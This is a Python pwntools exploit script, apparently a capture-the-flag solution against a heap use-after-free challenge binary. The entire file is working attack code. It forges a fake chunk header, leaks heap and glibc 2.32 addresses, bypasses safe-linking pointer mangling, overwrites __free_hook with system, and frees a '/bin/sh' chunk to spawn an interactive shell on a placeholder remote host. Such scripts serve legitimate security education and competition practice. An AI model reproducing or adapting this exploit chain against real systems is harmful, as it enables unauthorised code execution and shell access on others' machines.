#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('UAF.patch')

host = args.HOST or '1.2.3.4'
port = int(args.PORT or 1234)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['tmux', 'split', '-h']
io = start()

prm='Choice:'
def rprm(): io.recvuntil(prm)
def rcol(): io.recvuntil(':')

def alloc(size, data):
    rprm()
    io.sendline('1')
    rcol()
    io.sendline(str(size))
    rcol()
    io.send(data)

def free(idx):
    rprm()
    io.sendline('2')
    rcol()
    io.sendline(str(idx))

def edit(idx, data):
    rprm()
    io.sendline('3')
    rcol()
    io.sendline(str(idx))
    rcol()
    assert(len(data) == 1)
    io.send(data)

# heap start at 0x...2a0
heap_start_offset = 0x2a0

sz = 0x40
fake_header = p64(0xcafebabe) + p64(sz | 0x1)
alloc(0x60 + 0x20, b"A"*0x60 + fake_header) # 0

alloc(0x40, p64(0xdeadbeef) * 3 + p64(0x20 | 0x1)) # 1
alloc(0x30, b"C"*4) # 2
alloc(0x30, b"D"*4) # 3

free(2)
free(3)
edit(3, '\x49')

free(1)

alloc(0x30, b"C"*4)    # 1
alloc(0x30, b"FAKE") # 2
free(2)

free(0)
alloc(0x60 + 0x20, "A"*0x78)
free(0)

io.recvuntil(b'A'*0x78)
leak = u64(io.recvline().strip().ljust(8, b"\x00")) - 0x10
log.success("heap page {}".format(hex(leak)))

heap_base = leak

def enc_ptr(ptr, addr = heap_base):
    return ptr ^ (addr >> 12)

# 0
alloc(0x60 + 0x20, b"A"*0x60 + fake_header + p64(enc_ptr(0x0)) + p64(0x0))

# next alloc 2
alloc(0x40, "AAAA")

# 3 - fake
alloc(0x30, p64(0)*2 + p64(0) + p64(0x500 | 0x1)) 

# 4, 5
alloc(0x400, "X"*50)
alloc(0x400, b"Y"*0x8 + p64(0x0) * 2 + p64(0x21) + p64(0x0)*3 + p64(0x21))

free(2)
free(3)

# next alloc 2, 3
alloc(0x30, "A"*0x21)
free(2)
io.recvuntil(b'A'*0x21)
leak = u64(io.recvline().strip().ljust(8, b"\x00")) * 0x100 - 0x1e3c00
log.success("libc {}".format(hex(leak)))

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.32.so')
libc.address = leak

alloc(0x30, b"A"*0x10 + p64(0x0) + p64(0x501) + b"\x00")
free(1)
free(2)

free(0)

hook = libc.symbols['__free_hook']
log.info(hex(hook))

alloc(0x60+0x20, b"A"*0x60+fake_header+p64(enc_ptr(hook)))

# 2, 3

# TODO: should pivot and rop

alloc(0x30, "A")
alloc(0x30, p64(libc.symbols["system"]))

alloc(0x50, "/bin/sh\x00")
free(4)

#alloc(0x30, "C")

io.interactive()

